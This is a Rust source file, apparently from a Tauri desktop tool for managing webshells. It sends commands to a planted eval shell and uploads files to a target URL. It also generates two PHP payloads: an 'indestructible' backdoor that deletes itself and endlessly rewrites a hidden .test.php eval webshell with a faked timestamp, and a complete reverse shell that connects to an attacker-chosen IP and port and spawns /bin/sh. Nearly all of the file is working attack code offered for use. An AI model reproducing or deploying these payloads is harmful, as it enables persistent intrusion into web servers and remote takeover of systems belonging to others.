// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

pub mod core;
pub mod utils;

use core::{file_upload, rce};
use reqwest::Client;
use std::fs::read_to_string;
use std::path::Path;
use std::result::Result;
use utils::{encode, request};

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![
            base64_encode_system_command,
            upload_file,
            read_file_to_string,
            get_indestructible_backdoor_file,
            get_reverse_shell_file,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[tauri::command]
async fn base64_encode_system_command(
    url: String,
    key: String,
    command: String,
) -> Result<String, String> {
    let base64_echo = rce::echo_base64_encode_system_command(url, key, command).await;
    match base64_echo {
        Ok(base64_echo) => Ok(base64_echo),
        Err(_) => Err(String::from("error in echo encoded result.")),
    }
}

/// Receive base64 encoded file content and upload it to url.
#[tauri::command]
async fn upload_file(
    file_base64_content: String,
    url: String,
    key: String,
    filename: String,
) -> bool {
    let client = Client::new();
    // rce::upload_file(file_base64_content, url, key).await;
    let _ = file_upload::file_upload(&url, &key, &file_base64_content, &filename, &client).await;

    let url = request::modify_url(&url, &filename);

    match url {
        Some(url) => request::is_url_return_ok(&url, &client).await,
        None => false,
    }
}

#[tauri::command]
fn read_file_to_string(path: String) -> Result<String, String> {
    match read_to_string(Path::new(&path)) {
        Ok(content) => Ok(content),
        Err(e) => Err(format!("Failed to read file: {}", e)),
    }
}

#[tauri::command]
fn get_indestructible_backdoor_file(password: &str, key: &str) -> String {
    let password = encode::md5(password.to_string());
    format!(
        r#"<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.test.php';
$code = '<?php if(md5($_GET["pass"])=="{password}"){{@eval($_POST["{key}"]);}} ?>';
while (1){{
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .test.php');
    usleep(5000);
}}"#
    )
}

#[tauri::command]
fn get_reverse_shell_file(ip: &str, port: &str) -> String {
    format!(
        r#"<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid == -1) {{
        printit("ERROR: Can't fork");
        exit(1);
    }}
    if ($pid) {{
        exit(0);  
    }}
    if (posix_setsid() == -1) {{
        printit("Error: Can't setsid()");
        exit(1);
    }}
    $daemon = 1;
}} else {{
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    printit("$errstr ($errno)");
    exit(1);
}}
$descriptorspec = array(
    0 => array("pipe", "r"),  
    1 => array("pipe", "w"),  
    2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {{
    printit("ERROR: Can't spawn shell");
    exit(1);
}}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {{
    if (feof($sock)) {{
        printit("ERROR: Shell connection terminated");
        break;
    }}
    if (feof($pipes[1])) {{
        printit("ERROR: Shell process terminated");
        break;
    }}
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {{
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }}
    if (in_array($pipes[1], $read_a)) {{
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }}
    if (in_array($pipes[2], $read_a)) {{
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {{
    if (!$daemon) {{
        print "$string\n";
    }}
}}
?>"#
    )
}

// Learn more about Tauri commands at https://tauri.app/v1/guides/features/command

// #[tauri::command]
// fn my_custom_command() -> String {
//     String::from("I am a String.  was invoked from JS!")
// } // test

// #[tauri::command]
// fn submit_form(url: String, password: String) -> String {
//     format!(
//         "Recive Url: {}\
//     Recive Password: {}",
//         url, password
//     )
// } // test

// fn main() {
//     tauri::Builder::default()
//         .invoke_handler(tauri::generate_handler![
//             my_custom_command,
//             submit_form,
//             base64_encode_system_command
//         ])
//         .run(tauri::generate_context!())
//         .expect("error while running tauri application");
// }
